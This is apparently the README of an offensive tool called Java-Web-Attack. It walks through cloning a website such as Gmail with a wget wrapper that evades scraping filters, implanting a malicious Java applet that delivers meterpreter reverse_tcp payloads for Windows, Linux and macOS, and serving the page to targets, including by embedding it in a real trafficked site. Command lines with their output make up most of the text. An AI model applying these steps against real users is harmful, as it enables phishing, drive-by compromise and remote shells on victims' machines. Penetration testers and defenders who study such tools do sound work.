# Java-Web-Attack
[Documentation](https://github.com/adhdproject/java-web-attack)
[Website](https://github.com/adhdproject/java-web-attack)
Java-web-attack is a simple set of a few scripts which will download an HTML page, embed a malicious Java applet within it, and then re-host it for you to share with your target. 

Since Java applets have been being phased out for almost a decade, it's unclear how useful this tool would be nowadays. I definitely wouldn't rule it completely useless yet, though. 

### Usage
1. First, we need to clone a website that we wish to weaponize. We can use the `clone.sh` script to do this. The `clone.sh` script is a wrapper around wget which spoofs a desktop Chrome session to subvert web scraping filters. 

```
$ ./clone.sh https://gmail.com
Saving to: ‘index.html’ [ <=> ] 74,115 --.-K/s in 0.1s 
2015-02-21 02:52:13 (649 KB/s) - ‘index.html’ saved [74115] 
Converting index.html... 0-9 
Converted 1 files in 0.001 seconds.
```

2. Next, we need to embed the Java applet into the page with the `weaponize.py` script. By default, `weaponize.py` will implant a meterpreter reverse_tcp binary, though this is customizable with flags to the script.

```
$ ./weaponize.py index.html 172.16.215.138

Generating Windows payload: windows/meterpreter/reverse_tcp... 
Generating Linux payload: linux/x86/meterpreter/reverse_tcp... 
Generating Mac OS X payload: osx/x86/shell_reverse_tcp... 
Weaponizing html... 
Creating listener resource script... 
All output written to the "output" directory.
```

3. Finally, we must serve this weaponized HTML page to a target with Java applets enabled in their browser. The program can be tested using the generated `serve.sh` script, or it can be delivered by embedding into a real, trafficked website. Once the applet has run, the reverse_tcp client will reach out to our meterpreter server and we will be presented with a shell on their system. 
